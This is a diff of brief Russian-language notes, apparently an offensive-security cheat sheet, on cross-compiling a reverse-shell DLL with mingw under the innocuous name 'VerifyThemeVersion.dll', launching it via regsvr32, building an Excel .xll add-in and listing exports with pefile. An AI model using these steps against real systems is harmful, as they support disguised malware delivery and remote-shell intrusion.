@@ -1,15 +1,17 @@
-# c-c-
+# c#c++
  
 regsvr32.exe ReverseShellDLL.dll (запуск dll)
  
 -static     компиляция со всеми билиотеками во внутрь
 
-Cоздание dll
+Cоздание dll на с++
 
 
 sudo apt install mingw-w64
 
 x86_64-w64-mingw32-gcc-win32 shell.c -shared -lws2_32 -o VerifyThemeVersion.dll
+
+x86_64-w64-mingw32-gcc xll.c -shared -o test.xll
 
 python3 -m pefile exports VerifyThemeVersion.dll (скажет что за функции находятся внутри)
 
